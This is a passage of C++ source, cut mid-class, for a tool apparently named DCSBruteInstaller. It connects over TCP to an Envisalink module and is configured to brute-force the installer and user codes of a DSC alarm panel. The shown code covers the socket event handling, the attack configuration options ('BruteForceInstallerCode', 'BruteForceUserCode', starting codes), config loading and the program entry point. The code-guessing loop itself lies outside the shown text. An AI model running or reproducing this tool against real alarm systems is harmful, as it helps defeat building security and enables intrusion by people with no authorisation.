            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink tells us Installers Code Required" );
                SendQueuedMessage();
                break;
            }
            default:
            {
                GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink sent command: " + CORE::UInt16ToString( command ) );
                break;
            }
        }
    }

    void
    OnTCPSocketDataRecievedEvent( CORE::CNotifier* notifier    ,
                                  const CORE::CEvent& eventID  ,
                                  CORE::CICloneable* eventData )
    {GUCEF_TRACE;

        if ( 0 == eventData ) return;

        COMCORE::CTCPClientSocket::TDataRecievedEventData* eData = static_cast< COMCORE::CTCPClientSocket::TDataRecievedEventData* >( eventData );
        const CORE::CDynamicBuffer& buffer = eData->GetData();

        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: TCP Socket data received: " + CORE::UInt32ToString( buffer.GetDataSize() ) + " bytes" );

        CORE::CString messages( buffer.AsConstTypePtr< char >(), buffer.GetDataSize() );
        messages = messages.ReplaceChar( '\r', '\n' );
        TStringVector msgLines = messages.ParseElements( '\n', false );

        TStringVector::iterator i = msgLines.begin();
        while ( i != msgLines.end() )
        {
            OnMessageReceived( (*i) );
            ++i;
        }
    }

    void
    OnTCPSocketConnected( CORE::CNotifier* notifier    ,
                          const CORE::CEvent& eventID  ,
                          CORE::CICloneable* eventData )
    {GUCEF_TRACE;

        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: TCP Socket connected" );
    }

    void
    OnTCPSocketError( CORE::CNotifier* notifier    ,
                      const CORE::CEvent& eventID  ,
                      CORE::CICloneable* eventData )
    {GUCEF_TRACE;

        GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: TCP Socket experienced an error" );
    }

    void
    RegisterEventHandlers( void )
    {GUCEF_TRACE;

        // Register TCP socket event handlers
        TEventCallback callback1( this, &DCSBruteInstaller::OnTCPSocketConnecting );
        SubscribeTo( &m_tcpClientSocket                         ,
                     COMCORE::CTCPClientSocket::ConnectingEvent ,
                     callback1                                  );
        TEventCallback callback2( this, &DCSBruteInstaller::OnTCPSocketDataRecievedEvent );
        SubscribeTo( &m_tcpClientSocket                           ,
                     COMCORE::CTCPClientSocket::DataRecievedEvent ,
                     callback2                                    );
        TEventCallback callback3( this, &DCSBruteInstaller::OnTCPSocketDataSentEvent );
        SubscribeTo( &m_tcpClientSocket                       ,
                     COMCORE::CTCPClientSocket::DataSentEvent ,
                     callback3                                );
        TEventCallback callback4( this, &DCSBruteInstaller::OnTCPSocketError );
        SubscribeTo( &m_tcpClientSocket                          ,
                     COMCORE::CTCPClientSocket::SocketErrorEvent ,
                     callback4                                   );
        TEventCallback callback5( this, &DCSBruteInstaller::OnTCPSocketConnected );
        SubscribeTo( &m_tcpClientSocket                        ,
                     COMCORE::CTCPClientSocket::ConnectedEvent ,
                     callback5                                 );
        TEventCallback callback6( this, &DCSBruteInstaller::OnTCPSocketDisconnected );
        SubscribeTo( &m_tcpClientSocket                           ,
                     COMCORE::CTCPClientSocket::DisconnectedEvent ,
                     callback6                                    );
    }

    virtual const CORE::CString& GetClassTypeName( void ) const
    {GUCEF_TRACE;

        static const CORE::CString classTypeName = "DCSBruteInstaller";
        return classTypeName;
    }

    bool Setup( const CORE::CValueList& keyValueList )
    {GUCEF_TRACE;

        GUCEF_DEBUG_LOG( CORE::LOGLEVEL_NORMAL, "DCSBruteInstaller: Setup starting. " + CORE::UInt32ToString( keyValueList.GetKeyCount() ) + " Config keys were provided" );

        CORE::CPlatformNativeConsoleWindow consoleWindow;
        bool provideConsoleWindow = false;
        CORE::CString valueStr = keyValueList.GetValueAlways( "ProvideConsoleWindow" );
        if ( !valueStr.IsNULLOrEmpty() )
        {
            provideConsoleWindow = CORE::StringToBool( valueStr );
            if ( provideConsoleWindow )
            {
                consoleWindow.CreateConsole();
            }
        }

        CORE::Int32 minLogLevel = CORE::LOGLEVEL_BELOW_NORMAL;
        valueStr = keyValueList.GetValueAlways( "MinimalLogLevel" );
        if ( !valueStr.IsNULLOrEmpty() )
        {
            minLogLevel = CORE::StringToInt32( valueStr );
            CORE::CCoreGlobal::Instance()->GetLogManager().SetMinLogLevel( minLogLevel );
        }

        valueStr = keyValueList.GetValueAlways( "InstallerStartingCode" );
        if ( !valueStr.IsNULLOrEmpty() )
        {
            m_installerCode = CORE::StringToUInt16( valueStr );
        }

        valueStr = keyValueList.GetValueAlways( "UserStartingCode" );
        if ( !valueStr.IsNULLOrEmpty() )
        {
            m_masterCode = CORE::StringToUInt16( valueStr );
        }

        valueStr = keyValueList.GetValueAlways( "RequestSystemInfo" );
        if ( !valueStr.IsNULLOrEmpty() )
        {
            m_requestSystemInfo = CORE::StringToBool( valueStr );
        }

        valueStr = keyValueList.GetValueAlways( "BruteForceUserCode" );
        if ( !valueStr.IsNULLOrEmpty() )
        {
            m_attackUser = CORE::StringToBool( valueStr );
        }
        valueStr = keyValueList.GetValueAlways( "BruteForceInstallerCode" );
        if ( !valueStr.IsNULLOrEmpty() )
        {
            m_attackInstaller = CORE::StringToBool( valueStr );
        }

        CORE::CString tcpPortStr = keyValueList.GetValueAlways( "TcpPort" );
        if ( !tcpPortStr.IsNULLOrEmpty() )
        {
            m_envisalinkAddr.SetPortInHostByteOrder( CORE::StringToUInt16( tcpPortStr ) );
        }
        else m_envisalinkAddr.SetPortInHostByteOrder( 4025 );

        CORE::CString hostnameStr = keyValueList.GetValueAlways( "Hostname" );
        if ( !hostnameStr.IsNULLOrEmpty() )
        {
            m_envisalinkAddr.SetHostname( hostnameStr );
        }
        else return false;

        valueStr = keyValueList.GetValueAlways( "SendIndividualKeystrokes" );
        if ( !valueStr.IsNULLOrEmpty() )
        {
            m_sendIndividualKeystrokes = CORE::StringToBool( valueStr );
        }

        m_password = keyValueList.GetValueAlways( "Password" );

        return m_tcpClientSocket.ConnectTo( m_envisalinkAddr, false );
    }

    DCSBruteInstaller()
        : CORE::CObserver()                   ,
          m_tcpClientSocket( false )          ,
          m_envisalinkAddr()                  ,
          m_password()                        ,
          m_installerCode( 0 )                ,
          m_masterCode( 0 )                   ,
          m_requestSystemInfo( true )         ,
          m_sendIndividualKeystrokes( false ) ,
          m_ackReceivedForLastSend( true )    ,
          m_currentAttack( ATTACKTYPE_NONE )  ,
          m_attackUser( false )               ,
          m_attackInstaller( true )
    {GUCEF_TRACE;

        RegisterEventHandlers();
    }

    virtual ~DCSBruteInstaller()
    {GUCEF_TRACE;

        m_tcpClientSocket.Close();
    }
};

/*-------------------------------------------------------------------------*/

CORE::CString
LookForConfigFile( const CORE::CString& configFile )
{GUCEF_TRACE;

    GUCEF_LOG( CORE::LOGLEVEL_BELOW_NORMAL, "Checking for config file @ " + configFile );
    if ( !CORE::FileExists( configFile ) )
    {
        CORE::CString configFilePath = CORE::CombinePath( "$CURWORKDIR$", configFile );
        configFilePath = CORE::RelativePath( configFilePath );

        GUCEF_LOG( CORE::LOGLEVEL_BELOW_NORMAL, "Checking for config file @ " + configFilePath );
        if ( !CORE::FileExists( configFilePath ) )
        {
            configFilePath = CORE::CombinePath( "$MODULEDIR$", configFile );
            configFilePath = CORE::RelativePath( configFilePath );

            GUCEF_LOG( CORE::LOGLEVEL_BELOW_NORMAL, "Checking for config file @ " + configFilePath );
            if ( !FileExists( configFilePath ) )
            {
                configFilePath = CORE::CombinePath( "$TEMPDIR$", configFile );
                configFilePath = CORE::RelativePath( configFilePath );

                GUCEF_LOG( CORE::LOGLEVEL_BELOW_NORMAL, "Checking for config file @ " + configFilePath );
                if ( !FileExists( configFilePath ) )
                {
                    return CORE::CString::Empty;
                }
            }
        }

        return configFilePath;
    }

    return configFile;
}

/*-------------------------------------------------------------------------*/

bool
LoadConfig( const CORE::CString& bootstrapConfigPath   ,
            const CORE::CString& configPath            ,
            CORE::CValueList& keyValueList             ,
            CORE::CDataNode* loadedConfig = GUCEF_NULL )
{GUCEF_TRACE;

    #ifdef GUCEF_DEBUG_MODE
    const CORE::CString bootstrapConfigFile = "DCSBruteInstaller_bootstrap_d.ini";
    const CORE::CString configFile = "DCSBruteInstaller_d.ini";
    #else
    const CORE::CString bootstrapConfigFile = "DCSBruteInstaller_bootstrap.ini";
    const CORE::CString configFile = "DCSBruteInstaller.ini";
    #endif

    CORE::CConfigStore& configStore = CORE::CCoreGlobal::Instance()->GetConfigStore();

    CORE::CString bootstrapConfigFilePath = LookForConfigFile( bootstrapConfigFile );
    CORE::CString configFilePath = LookForConfigFile( configFile );

    if ( !bootstrapConfigFilePath.IsNULLOrEmpty() )
    {
        GUCEF_LOG( CORE::LOGLEVEL_NORMAL, "Located bootstrap config file @ " + bootstrapConfigFilePath );
        configStore.SetBootstrapConfigFile( bootstrapConfigFilePath );
    }
    if ( !configFilePath.IsNULLOrEmpty() )
    {
        GUCEF_LOG( CORE::LOGLEVEL_NORMAL, "Located config file @ " + configFilePath );
        configStore.SetConfigFile( configFilePath );
    }
    if ( bootstrapConfigFilePath.IsNULLOrEmpty() && configFilePath.IsNULLOrEmpty() )
    {
        GUCEF_WARNING_LOG( CORE::LOGLEVEL_NORMAL, "Unable to locate any config file, will rely on params only" );
    }

    CORE::CGlobalConfigValueList globalCfg;
    globalCfg.SetConfigNamespace( "Main/AppArgs" );
    globalCfg.SetAllowDuplicates( false );
    globalCfg.SetAllowMultipleValues( true );

    bool loadSuccess = configStore.LoadConfig( loadedConfig );

    keyValueList = globalCfg;
    return loadSuccess;
}

/*-------------------------------------------------------------------------*/

void
ParseParams( const int argc                 ,
             char* argv[]                   ,
             CORE::CValueList& keyValueList )
{GUCEF_TRACE;

    GUCEF::CORE::CString argString;
    if ( argc > 0 )
    {
        argString = *argv;

        // Combine the argument strings back into a single string because we don't want to use
        // a space as the seperator
        for ( int i=1; i<argc; ++i )
        {
            argString += ' ' + CORE::CString( argv[ i ] );
        }

        // Parse the param list based on the ' symbol
        GUCEF_LOG( CORE::LOGLEVEL_NORMAL, "Application parameters: " + argString );
        keyValueList.SetMultiple( argString, '*' );
    }
}

/*-------------------------------------------------------------------------*/

/*
 *      Application entry point
 */
GUCEF_OSMAIN_BEGIN
{GUCEF_TRACE;

    CORE::CString test = DCSBruteInstaller::AppendChecksumAndCrLf( "000" );
     test = DCSBruteInstaller::AppendChecksumAndCrLf( "071*8000" );

    GUCEF_LOG( CORE::LOGLEVEL_NORMAL, "This tool was compiled on: " __DATE__ " @ " __TIME__ );

    CORE::CCoreGlobal::Instance();
    COMCORE::CComCoreGlobal::Instance();

    // Check for config param first
    CORE::CValueList keyValueList;
    ParseParams( argc, argv, keyValueList );
    CORE::CString bootstrapConfigPathParam = keyValueList.GetValueAlways( "BootstrapConfigPath" );
    CORE::CString configPathParam = keyValueList.GetValueAlways( "ConfigPath" );
    keyValueList.Clear();

    // Load settings from a config file (if any) and then override with params (if any)
    CORE::CDataNode loadedConfig;
    LoadConfig( bootstrapConfigPathParam, configPathParam, keyValueList, &loadedConfig );
    ParseParams( argc, argv, keyValueList );

    CORE::CString outputDir = keyValueList.GetValueAlways( "outputDir" );
    if ( outputDir.IsNULLOrEmpty() )
    {
        outputDir = CORE::RelativePath( "$CURWORKDIR$" );
    }
    CORE::CreateDirs( outputDir );

    CORE::CString logFilename = CORE::CombinePath( outputDir, "DCSBruteInstaller_Log.txt" );

    keyValueList.Set( "logfile", logFilename );

    CORE::CFileAccess logFileAccess( logFilename, "w" );
    CORE::CStdLogger logger( logFileAccess );
    CORE::CCoreGlobal::Instance()->GetLogManager().AddLogger( &logger );

    CORE::CPlatformNativeConsoleLogger console;
    CORE::CCoreGlobal::Instance()->GetLogManager().AddLogger( console.GetLogger() );

    CORE::CCoreGlobal::Instance()->GetLogManager().FlushBootstrapLogEntriesToLogs();

    DCSBruteInstaller dcsBruteInstaller;
    if ( dcsBruteInstaller.Setup( keyValueList ) )
    {
        return CORE::CCoreGlobal::Instance()->GetApplication().main( argc, argv, true );
    }
    GUCEF_ERROR_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Exiting because setup failed" );
    return -1;
}
GUCEF_OSMAIN_END

/*---------------------------------------------------------------------------*/
